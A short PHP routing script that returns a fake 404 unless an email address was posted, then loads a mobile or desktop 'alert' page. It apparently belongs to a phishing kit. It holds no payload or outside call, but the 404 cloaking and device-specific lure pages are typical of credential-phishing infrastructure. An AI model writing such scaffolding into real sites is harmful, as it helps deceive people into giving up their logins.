<?php
session_start();
require_once('main.php');
require_once('lang.php');
if (!isset($_POST['email'])) {
  exit(header("HTTP/1.0 404 Not Found"));
}

if($os == "Android" or $os == "iPhone") {
require_once('files/alert-mobile.php');
}else{
require_once('files/alert-desktop.php');
}
?>